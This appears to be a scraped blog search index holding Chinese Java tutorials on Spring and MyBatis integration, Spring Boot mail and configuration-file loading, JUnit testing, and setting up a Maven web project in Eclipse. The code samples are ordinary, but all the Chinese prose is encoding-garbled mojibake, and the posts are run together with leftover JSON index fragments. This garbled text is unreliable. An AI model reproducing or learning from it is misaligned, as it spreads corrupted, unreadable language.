&lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:application-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;spring&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;!-- å­—ç¬¦é›†ç¼–ç è¿‡æ»¤å™¨ --&gt; &lt;filter&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; é¡¹ç›®æ ¸å¿ƒä»£ç DAO å±‚ EmployeeMapper 12345678910111213141516package com.clay.mybatis.dao;import java.util.List;import org.apache.ibatis.annotations.Mapper;import com.clay.mybatis.bean.Employee;@Mapperpublic interface EmployeeMapper { public List&lt;Employee&gt; queryAll(); public boolean delEmpById(Long id);} Service å±‚ EmployeeService 12345678910111213package com.clay.mybatis.service;import java.util.List;import com.clay.mybatis.bean.Employee;public interface EmployeeService { public List&lt;Employee&gt; list(); public boolean deleteEmployee(Long id);} EmployeeServiceImpl 12345678910111213141516171819202122232425262728package com.clay.mybatis.service.impl;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import com.clay.mybatis.bean.Employee;import com.clay.mybatis.dao.EmployeeMapper;import com.clay.mybatis.service.EmployeeService;@Servicepublic class EmployeeServiceImpl implements EmployeeService { @Autowired private EmployeeMapper employeeMapper; @Override public List&lt;Employee&gt; list() { return this.employeeMapper.queryAll(); } @Override public boolean deleteEmployee(Long id) { return this.employeeMapper.delEmpById(id); }} Controller å±‚ HomePageController 123456789101112131415161718192021222324package com.clay.mybatis.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;@Controllerpublic class HomePageController { @RequestMapping("/") public String index() { return "index"; } @RequestMapping("/index.jsp") public String indexJsp() { return "index"; } @RequestMapping("/index.html") public String indexHtml() { return "index"; }} EmployeeController 1234567891011121314151617181920212223242526272829303132333435package com.clay.mybatis.controller;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.servlet.ModelAndView;import com.clay.mybatis.bean.Employee;import com.clay.mybatis.service.EmployeeService;@Controller@RequestMapping("/employee")public class EmployeeController { @Autowired private EmployeeService employeeService; @RequestMapping("/list") public ModelAndView list() { List&lt;Employee&gt; list = this.employeeService.list(); ModelAndView view = new ModelAndView("/employee/list", "employees", list); return view; } @ResponseBody @RequestMapping("/delete/{id}") public boolean deleteEmployee(@PathVariable("id") Long id) { return this.employeeService.deleteEmployee(id); }} JSP é¡µé¢ä»£ç æç¤º æ ¹æ®ä¸Šé¢çš„ web.xml é…ç½®æ–‡ä»¶ï¼ŒJSP é¡µé¢çš„æºæ–‡ä»¶ç»Ÿä¸€å­˜æ”¾åœ¨ /src/main/webapp/WEB-INF/pages ç›®å½•ä¸‹ã€‚ index.jsp 1234567891011&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;å‘˜å·¥åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href="/ssm-study/employee/list/"&gt;æŸ¥è¯¢æ‰€æœ‰å‘˜å·¥ä¿¡æ¯&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; /employee/list.jsp 123456789101112131415161718192021222324252627&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;å‘˜å·¥åˆ—è¡¨&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;lastName&lt;/th&gt; &lt;th&gt;email&lt;/th&gt; &lt;th&gt;gender&lt;/th&gt; &lt;/tr&gt; &lt;c:forEach items="${requestScope.employees}" var="employee"&gt; &lt;tr&gt; &lt;td&gt;${employee.id }&lt;/td&gt; &lt;td&gt;${employee.lastName }&lt;/td&gt; &lt;td&gt;${employee.email }&lt;/td&gt; &lt;td&gt;${employee.gender }&lt;/td&gt; &lt;/tr&gt; &lt;/c:forEach&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; SQL æ˜ å°„æ–‡ä»¶æç¤º æ ¹æ®ä¸Šé¢çš„ application-context.xml é…ç½®æ–‡ä»¶ï¼ŒSQL æ˜ å°„æ–‡ä»¶ç»Ÿä¸€å­˜æ”¾åœ¨ /src/main/resources/mapper ç›®å½•ä¸‹ã€‚ 123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="queryAll" resultType="Employee"&gt; select id, last_name, gender, email from t_employee &lt;/select&gt; &lt;delete id="delEmpById" parameterType="Long"&gt; delete from t_employee where id = #{id} &lt;/delete&gt;&lt;/mapper&gt; é¡¹ç›®ä»£ç æµ‹è¯•åœ¨ Eclipse å†…å°†é¡¹ç›®éƒ¨ç½²åˆ° Tomcat æœåŠ¡å™¨ï¼Œç„¶åæµè§ˆå™¨æ‰“å¼€ http://127.0.0.1:8080/ssm-study/employee/list/ï¼Œè‹¥çœ‹åˆ°ä¸‹é¢çš„é¡µé¢å†…å®¹ï¼Œåˆ™è¯´æ˜ Spring æˆåŠŸæ•´åˆäº† MyBatisã€‚ é¡¹ç›®å®Œæ•´çš„ç›®å½•ç»“æ„å›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"SpringBoot å¼€å‘éšç¬”",url:"/posts/4e06a2ec.html",text:'Spring Boot é…ç½®é‚®ä»¶å‘é€åœ¨æœ¬åœ°å¼€å‘ç¯å¢ƒæµ‹è¯•ï¼ŒSpring Boot èƒ½å¤Ÿæ­£å¸¸å‘é€é‚®ä»¶ï¼Œä½†éƒ¨ç½²åˆ°é˜¿é‡Œäº‘ ECS æœåŠ¡å™¨ä»¥åï¼Œä¸€ç›´æ²¡æœ‰æ”¶åˆ°é‚®ä»¶ï¼Œéƒ¨åˆ†å…³é”®æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 12345678org.springframework.mail.MailSendException: Mail server connection failed; nested exception is com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: è¿æ¥è¶…æ—¶ (Connection timed out). Failed messages: com.sun.mail.util.MailConnectException: Couldn\'t connect to host, port: smtp.163.com, 25; timeout -1; nested exception is: java.net.ConnectException: è¿æ¥è¶…æ—¶ (Connection timed out) at org.springframework.mail.javamail.JavaMailSenderImpl.doSend(JavaMailSenderImpl.java:447) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:322) at org.springframework.mail.javamail.JavaMailSenderImpl.send(JavaMailSenderImpl.java:311) ä»ç°æœ‰æƒ…å†µçœ‹ï¼Œè·Ÿç¨‹åºè¿è¡Œç¯å¢ƒæœ‰å…³ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™ï¼Œå‘ç°åœ¨é˜¿é‡Œäº‘ ECS æœåŠ¡å™¨ä¸Šï¼Œé»˜è®¤ç¦ç”¨äº† 25 ç«¯å£ï¼Œæ‰€ä»¥åœ¨é€šè¿‡ 25 ç«¯å£å»è¿æ¥é‚®ä»¶æœåŠ¡å™¨æ—¶ï¼Œæ— æ³•è¿ä¸Šï¼Œå°±æŠ¥è¶…æ—¶äº†ã€‚å®˜æ–¹å»ºè®®ä½¿ç”¨ 465 ç«¯å£ï¼Œè€Œ 456 ç«¯å£æ˜¯ SSL åè®®çš„ï¼Œæ‰€ä»¥ä¸ä»…è¦æ¢ç«¯å£ï¼Œè¿˜éœ€è¦è¿›è¡Œ SSL åè®®æ›¿æ¢ã€‚ä¸‹é¢æ˜¯åœ¨ application.properties è¿›è¡Œçš„é‚®ä»¶å‘é€ç›¸å…³é…ç½®ï¼Œç»è¿‡è¿™æ ·é…ç½®åï¼Œåœ¨é˜¿é‡Œ ECS ä¸Šå°±èƒ½å¤Ÿæ­£å¸¸å‘é€é‚®ä»¶äº† 123456789101112131415# Mail Configspring.mail.host=smtp.163.comspring.mail.username=xxx@163.comspring.mail.password=xxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=true# SSL Configspring.mail.port=465spring.mail.protocol=smtpspring.mail.default-encoding=UTF-8spring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socketFactory.port=465spring.mail.properties.mail.smtp.socketFactory.class=javax.net.ssl.SSLSocketFactory 163 é‚®ç®±ç›¸å…³æœåŠ¡å™¨ä¿¡æ¯å¦‚ä¸‹ï¼š bootstrap.yml ä¸ application.yml çš„åŒºåˆ«åŠ è½½é¡ºåº bootstrap.yml &gt; application.yml &gt; application-dev.yml bootstrap.yml ä½œç”¨äºåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡çš„å¼•å¯¼é˜¶æ®µï¼Œbootstrap.yml ç”±çˆ¶ Spring ApplicationContext åŠ è½½ è‹¥ bootstrap.yml å’Œ application.yml åœ¨åŒä¸€ç›®å½•ä¸‹æ—¶ï¼Œbootstrap.yml å…ˆåŠ è½½ï¼Œapplication.yml ååŠ è½½ è‹¥ application.properties å’Œ application.yml åœ¨åŒä¸€ç›®å½•ä¸‹æ—¶ï¼Œä¸”å­˜åœ¨ç›¸åŒçš„é…ç½®ï¼Œåˆ™ application.properties ä¼šè¦†ç›– application.yml é‡Œé¢çš„å±æ€§ï¼Œå› ä¸º application.properties ä¼šååŠ è½½ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªä¸ªæ–‡ä»¶è¢«æœ€ååŠ è½½ï¼Œå“ªä¸ªæ‰å…·æœ‰æœ€é«˜çº§ é…ç½®åŒºåˆ« bootstrap.yml å’Œ application.yml éƒ½å¯ä»¥ç”¨æ¥é…ç½®å‚æ•° bootstrap.yml ç”¨æ¥ç¨‹åºå¼•å¯¼æ—¶æ‰§è¡Œï¼Œåº”ç”¨äºæ›´åŠ æ—©æœŸé…ç½®ä¿¡æ¯è¯»å–ï¼Œå¯ä»¥ç†è§£æˆç³»ç»Ÿçº§åˆ«çš„ä¸€äº›å‚æ•°é…ç½®ï¼Œè¿™äº›å‚æ•°ä¸€èˆ¬æ˜¯ä¸ä¼šå˜åŠ¨çš„ï¼Œä¸€æ—¦ bootStrap.yml è¢«åŠ è½½ï¼Œåˆ™å†…å®¹ä¸ä¼šè¢«è¦†ç›– application.yml ç”¨æ¥å®šä¹‰åº”ç”¨çº§åˆ«çš„é…ç½®å‚æ•°ï¼Œå³åº”ç”¨ç¨‹åºç‰¹æœ‰çš„é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥é…ç½®åç»­å„ä¸ªæ¨¡å—ä¸­éœ€ä½¿ç”¨çš„å…¬å…±å‚æ•°ç­‰ã€‚å¦‚æœåŠ è½½çš„ application.yml çš„å†…å®¹æ ‡ç­¾ä¸ bootstrap.yml çš„æ ‡ç­¾ä¸€è‡´ï¼Œé‚£ä¹ˆ application.yml ä¼šè¦†ç›– bootstrap.yml, è€Œ application.yml é‡Œé¢çš„å†…å®¹å¯ä»¥åŠ¨æ€æ›¿æ¢ å…¸å‹åº”ç”¨åœºæ™¯ ä¸€äº›åŠ å¯† / è§£å¯†çš„åœºæ™¯ ä¸€äº›å›ºå®šçš„ä¸èƒ½è¢«è¦†ç›–çš„å±æ€§ å½“ä½¿ç”¨ Spring Cloud Config Server çš„æ—¶å€™ï¼Œåº”è¯¥åœ¨ bootstrap.yml é‡Œé¢æŒ‡å®š spring.application.name å’Œ spring.cloud.config.server.git.uriã€‚è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨ Spring Cloud çš„æ—¶å€™ï¼Œé…ç½®ä¿¡æ¯ä¸€èˆ¬æ˜¯ä» Config Server åŠ è½½çš„ï¼Œä¸ºäº†å–å¾—é…ç½®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰ï¼‰ï¼Œéœ€è¦ä¸€äº›ææ—©çš„æˆ–å¼•å¯¼é…ç½®ã€‚å› æ­¤ï¼ŒæŠŠ Config Server ä¿¡æ¯æ”¾åœ¨ bootstrap.ymlï¼Œç”¨æ¥åŠ è½½çœŸæ­£éœ€è¦çš„é…ç½®ä¿¡æ¯ã€‚ æ‰«æçˆ¶æ¨¡å—çš„ Mapper ç±»ä¸ XML æ˜ å°„æ–‡ä»¶å­æ¨¡å—è‹¥å¸Œæœ›æ‰«æåˆ°çˆ¶æ¨¡å—é‡Œ MyBatis çš„ Mapper ç±»ä¸ XML æ˜ å°„æ–‡ä»¶ï¼Œéœ€è¦åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š åœ¨ä¸»å¯åŠ¨ç±»ä¸ŠæŒ‡å®š Mapper æ‰«æçš„åŒ…åï¼Œçˆ¶æ¨¡å—çš„åŒ…åå‘½åè§„åˆ™å¿…é¡»ç¬¦åˆ com.shop.**.mapper è§„åˆ™ 12345@MapperScan(basePackages = "com.shop.**.mapper")@SpringBootApplication(scanBasePackages = "com.shop")public class AuthApplication {} åœ¨ MyBatis-Plus çš„é…ç½®ä¸­ï¼ŒæŒ‡å®š XML æ˜ å°„æ–‡ä»¶çš„æ‰«æè·¯å¾„ï¼ŒåŒæ—¶æŒ‡å®š MyBatis çš„ç±»å‹åˆ«åæ‰«æè§„åˆ™ 123mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml type-aliases-package: com.shop.**.entity Spring Boot å•å…ƒæµ‹è¯•åŸºç¡€ä½¿ç”¨ å¼•å…¥ Maven ä¾èµ– 1234567891011&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; æ·»åŠ  @RunWithã€@SpringBootTest æ³¨è§£ 123456789@RunWith(SpringRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} å…¶ä¸­æœ‰ä¸¤ä¸ª runner å¯ä»¥é€‰æ‹©ï¼Œåˆ†åˆ«æ˜¯ SpringRunner å’Œ SpringJUnit4ClassRunnerã€‚å¦‚æœæ˜¯åœ¨ Junit 4.3 ä¹‹å‰ï¼Œåªèƒ½é€‰æ‹© SpringJUnit4ClassRunnerï¼Œå¦‚æœæ˜¯ Junit 4.3 ä¹‹åï¼Œå»ºè®®é€‰æ‹© SpringRunnerï¼Œå…¶ä¸­ SpringRunner ä»…ä»…ç»§æ‰¿äº† SpringJUnit4ClassRunnerï¼Œæ²¡æœ‰ä»»ä½•çš„é¢å¤–ä»£ç ã€‚ 123456789@RunWith(SpringJUnit4ClassRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} æ³¨è§£è¯´æ˜ @RunWithï¼šæ ‡è¯†ä¸º JUnit çš„è¿è¡Œç¯å¢ƒ @SpringBootTestï¼šè·å–å¯åŠ¨ç±»ã€åŠ è½½é…ç½®ï¼Œç¡®å®šè£…è½½ Spring Boot @Testï¼šå£°æ˜éœ€è¦æµ‹è¯•çš„æ–¹æ³• @BeforeClassï¼šé’ˆå¯¹æ‰€æœ‰æµ‹è¯•ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸”å¿…é¡»è¢« static void ä¿®é¥° @AfterClassï¼šé’ˆå¯¹æ‰€æœ‰æµ‹è¯•ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸”å¿…é¡»è¢« static void ä¿®é¥° @Beforeï¼šæ¯ä¸ªæµ‹è¯•æ–¹æ³•è¿è¡Œå‰éƒ½ä¼šæ‰§è¡Œçš„æ–¹æ³• @Afterï¼šæ¯ä¸ªæµ‹è¯•æ–¹æ³•è¿è¡Œåéƒ½ä¼šæ‰§è¡Œçš„æ–¹æ³• @Ignoreï¼šå¿½ç•¥æ–¹æ³• æ–­è¨€æµ‹è¯• æ–­è¨€æµ‹è¯•ä¹Ÿå°±æ˜¯æœŸæœ›å€¼æµ‹è¯•ï¼Œæ˜¯å•å…ƒæµ‹è¯•çš„æ ¸å¿ƒï¼Œä¹Ÿå°±æ˜¯å†³å®šæµ‹è¯•ç»“æœçš„è¡¨è¾¾å¼ï¼ŒAssert å¯¹è±¡ä¸­çš„æ–­è¨€æ–¹æ³•å¦‚ä¸‹ï¼š Assert.assertEqualsï¼šå¯¹æ¯”ä¸¤ä¸ªå€¼ç›¸ç­‰ Assert.assertNotEqualsï¼šå¯¹æ¯”ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰ Assert.assertSameï¼šå¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡çš„å¼•ç”¨ç›¸ç­‰ Assert.assertArrayEqualsï¼šå¯¹æ¯”ä¸¤ä¸ªæ•°ç»„ç›¸ç­‰ Assert.assertTrueï¼šéªŒè¯è¿”å›æ˜¯å¦ä¸ºçœŸ Assert.assertFlaseï¼šéªŒè¯è¿”å›æ˜¯å¦ä¸ºå‡ Assert.assertNullï¼šéªŒè¯ Null Assert.assertNotNullï¼šéªŒè¯é Null è¶…æ—¶æµ‹è¯• ç»™ @Test æ³¨è§£è®¾ç½® timeout å±æ€§å³å¯ï¼Œæ—¶é—´å•ä½ä¸ºæ¯«ç§’ï¼š 1@Test(timeout = 1000) æ•°æ®åº“æµ‹è¯• åœ¨æµ‹è¯•æ•°æ®æ“ä½œçš„æ—¶å€™ï¼Œè‹¥ä¸æƒ³è®©æµ‹è¯•æ•°æ®æ±¡æŸ“æ•°æ®åº“ï¼Œåªéœ€è¦ç»™æµ‹è¯•ç±»æˆ–è€…æµ‹è¯•æ–¹æ³•æ·»åŠ  @Transactional æ³¨è§£å³å¯ï¼Œè¿™æ ·æ—¢å¯ä»¥æµ‹è¯•æ•°æ®æ“ä½œæ–¹æ³•ï¼Œåˆä¸ä¼šæ±¡æŸ“æ•°æ®åº“ï¼Œå³é»˜è®¤ä¼šå›æ»šå¯¹æ•°æ®åº“çš„æ‰€æœ‰å†™æ“ä½œã€‚ 1234567891011@Test@Transactionalpublic void saveTest() { User user = new User(); user.setName("Adam"); user.setAge(19); user.setPwd("123456"); userRepository.save(user); System.out.println("userId:" + user.getId()); Assert.assertTrue(user.getId()&gt;0);} Web æ¨¡æ‹Ÿæµ‹è¯• åœ¨ Spring Boot é¡¹ç›®é‡Œé¢å¯ä»¥ç›´æ¥ä½¿ç”¨ Junit å¯¹ Web é¡¹ç›®è¿›è¡Œæµ‹è¯•ï¼ŒSpring æä¾›äº† TestRestTemplate å¯¹è±¡ï¼Œä½¿ç”¨è¿™ä¸ªå¯¹è±¡å¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿›è¡Œè¯·æ±‚æ¨¡æ‹Ÿã€‚ Web æµ‹è¯•åªéœ€è¦è¿›è¡Œä¸¤æ­¥æ“ä½œï¼š åœ¨ @SpringBootTest æ³¨è§£ä¸Šè®¾ç½® webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORTï¼Œå³ä½¿ç”¨éšæœºç«¯å£ ä½¿ç”¨ TestRestTemplate ç±»è¿›è¡Œ POST æˆ– GET è¯·æ±‚ 12345678910111213@RunWith(SpringRunner.class)@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)public class UserControllerTest { @Autowired private TestRestTemplate restTemplate; @Test public void getName() { String name = restTemplate.getForObject("/name", String.class); Assert.assertEquals("Adam", name); }} å…¶ä¸­ getForObject() çš„å«ä¹‰ä»£è¡¨æ‰§è¡Œ GET è¯·æ±‚ï¼Œå¹¶è¿”å› Object ç±»å‹çš„ç»“æœï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå°†è¿”å›ç»“æœè½¬æ¢ä¸º String ç±»å‹ï¼Œæ›´å¤šçš„è¯·æ±‚æ–¹æ³•å¦‚ä¸‹ï¼š getForEntityï¼šGet è¯·æ±‚ï¼Œè¿”å›å®ä½“å¯¹è±¡ï¼ˆå¯ä»¥æ˜¯é›†åˆï¼‰ postForEntityï¼šPost è¯·æ±‚ï¼Œè¿”å›å®ä½“å¯¹è±¡ï¼ˆå¯ä»¥æ˜¯é›†åˆï¼‰ postForObjectï¼šPost è¯·æ±‚ï¼Œè¿”å›å¯¹è±¡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¼€å‘éšç¬”"},{title:"Eclipse åˆ›å»ºåŸºäº Maven çš„ Web é¡¹ç›®ï¼ˆåŠ¨æ€ï¼‰",url:"/posts/103477a2.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•ä½¿ç”¨ Eclipse åˆ›å»ºåŸºäº Maven çš„ Web é¡¹ç›®ï¼ˆåŠ¨æ€ï¼‰ï¼Œé€‚ç”¨äºä»»ä½•ç‰ˆæœ¬çš„ Eclipseã€‚ å¿«é€Ÿå¼€å§‹åˆ›å»º Maven Web é¡¹ç›® åˆ›å»º Maven é¡¹ç›®ï¼Œå¹¶è‡ªå®šä¹‰å·¥ä½œç©ºé—´çš„ä½ç½® é€‰æ‹© Web é¡¹ç›®çš„éª¨æ¶ è®¾ç½® Group Id å’Œ Artifact Id æç¤º Group Idï¼šé¡¹ç›®ç»„ç»‡å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå®é™…å¯¹åº” Java çš„åŒ…çš„ç»“æ„ï¼Œæ˜¯ main ç›®å½•é‡Œ java çš„ç›®å½•ç»“æ„ Artifact Idï¼šé¡¹ç›®çš„å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå®é™…å¯¹åº”é¡¹ç›®çš„åç§°ï¼Œå°±æ˜¯é¡¹ç›®æ ¹ç›®å½•çš„åç§° å®Œå–„é¡¹ç›®çš„ç›®å½•ç»“æ„åˆ›å»º java ç›®å½•é€‰ä¸­é¡¹ç›® -&gt; å³å‡» -&gt; Properties - Java Builder Path -&gt; Libraries -&gt; JRE System Library -&gt; Edit -&gt; é€‰ä¸­ Alternate JRE -&gt; é€‰æ‹©æœ¬åœ°çš„ JDK ç‰ˆæœ¬ -&gt; Finish â€“&gt; Apply -&gt; Apply and Close å®Œæˆä¸Šè¿°æ­¥éª¤åï¼Œåœ¨é¡¹ç›®å†…ä¼šè‡ªåŠ¨æ˜¾ç¤ºå‡º src/main/java å’Œ src/test/java ç›®å½•ã€‚è¿™äº›ç›®å½•å¹¶ä¸æ˜¯æ²¡æœ‰åˆ›å»ºè€Œæ˜¯é»˜è®¤è¢«éšè—äº†ï¼Œç”±äºåˆ›å»º Maven é¡¹ç›®æ—¶ä½¿ç”¨äº† Eclipse é‡Œçš„é»˜è®¤æ¨¡æ¿ï¼Œè€Œé»˜è®¤æ¨¡æ¿çš„ JRE ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œé»˜è®¤è¢«è®¾ç½®ä¸ºéšè—é€ æˆçš„ï¼Œè¯¦ç»†è¯´æ˜è¯·çœ‹è¿™é‡Œã€‚ åˆ›å»º resources ç›®å½•é€‰ä¸­é¡¹ç›® -&gt; å³å‡» -&gt; New -&gt; Source Foldeï¼Œç„¶åæ‰‹åŠ¨åˆ›å»ºä»¥ä¸‹çš„èµ„æºæ–‡ä»¶ç›®å½•ï¼š src/main/resources src/test/resources å®Œå–„åçš„é¡¹ç›®ç›®å½•ç»“æ„ é…ç½® Maven Web é¡¹ç›®æ›´æ”¹ JDK çš„ç‰ˆæœ¬åœ¨ Maven çš„ pom.xml é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 12345678910111213141516&lt;properties&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;&lt;/properties&gt;&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;11&lt;/source&gt; &lt;target&gt;11&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt;&lt;/plugins&gt; æ›´æ”¹ Servlet çš„ç‰ˆæœ¬åœ¨ Maven çš„ pom.xml é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 123456 &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; æ›´æ”¹ web.xml é…ç½®æ–‡ä»¶é€‰ä¸­é¡¹ç›® -&gt; å³å‡» -&gt; Properties -&gt; Project Facets -&gt; å°† Dynamic Web Module å‰è¾¹çš„å‹¾å»æ‰ï¼Œç„¶åä¿®æ”¹ä¸º 3.0 ç‰ˆæœ¬ -&gt; å†ä¿®æ”¹ Java çš„ç‰ˆæœ¬ -&gt; Apply å†æ¬¡å‹¾é€‰ Dynamic Web Module å‰è¾¹çš„å‹¾ï¼Œä¸‹è¾¹ä¼šç«‹åˆ»å‡ºç°ä¸€ä¸ª Further configuration available è¶…é“¾æ¥ï¼Œç„¶åç‚¹å‡»å®ƒ æ›´æ”¹ Content directory çš„è·¯å¾„ï¼Œå¹¶å‹¾é€‰è¦æ±‚ç”Ÿæˆ web.xml é…ç½®æ–‡ä»¶ï¼Œç„¶åç‚¹å‡» OK æŒ‰é’® æœ€åç¼–è¾‘ web.xml é…ç½®æ–‡ä»¶ï¼Œå°†ä¸‹è¾¹çš„ä»£ç æ›¿æ¢æ‰åŸæœ‰çš„é…ç½®å†…å®¹ 12345678&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://JAVA.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt; &lt;/web-app&gt; è¿è¡Œ Maven Web é¡¹ç›®æ·»åŠ  Tomcat è¿è¡Œç¯å¢ƒé€‰ä¸­é¡¹ç›® -&gt; å³å‡» -&gt; Properties -&gt; Server -&gt; Runtime Environments -&gt; Add é€‰æ‹© Tomcat æœåŠ¡å™¨çš„ç›®æ ‡ç‰ˆæœ¬ï¼Œç„¶åç‚¹å‡» Next æŒ‰é’® é€‰æ‹©æœ¬åœ° Tomcat 